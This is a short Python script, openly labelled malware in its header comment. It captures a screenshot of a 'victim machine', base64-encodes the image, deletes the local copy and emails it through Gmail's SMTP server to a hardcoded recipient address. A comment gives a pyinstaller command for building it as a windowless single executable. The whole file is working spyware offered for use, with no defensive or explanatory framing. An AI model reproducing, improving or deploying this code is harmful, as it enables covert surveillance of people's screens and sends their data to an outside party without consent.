# this malware is able to grab screenshot og the victim machine 
# and send them to the attacker through the email-service like gmail../

#! usr/bin/python 

import base64
import sys 
import os
import time 
try :
    from PIL import ImageGrab 

    from email.mime.text import MIMEtext
    from email.mime.multipart import MIMEMultipart 

except:
    os.system("pip install pillow ; pip install email")
grabscreen = ImageGrab.grab()
file = "screen.jpg"
grabscreen.save(file)
import os
import smtplib

f=open('screen.jpg','rb')      #Open file in binary mode
data=f.read()
data=base64.b64encode(data) #Convert binary to base64 
f.close()
#  file is also saved on the local machine 

# pyinstaller -w -F  .py
os.remove(file) # removing the original file system..

s = smtplib.SMTP('smtp.gmail.com', 587)   # smtp connection starting with gmail's smtp server  ....
s.starttls()
login_mail = input("please enter your mail: ")
login_pass = input("enter your mail password: ")

# [!]Remember! You need to enable 'Allow less secure apps' in your #google account
# Enter your gmail username and password
s.login(login_mail, login_pass) 
  
# message to be sent 
message = data # data variable has the base64 string of screenshot
  
# Sender email, recipient email 
s.sendmail("789sk.email@gmail.com", "wifipwd9@gmail.com", message) 
s.quit()
# end..
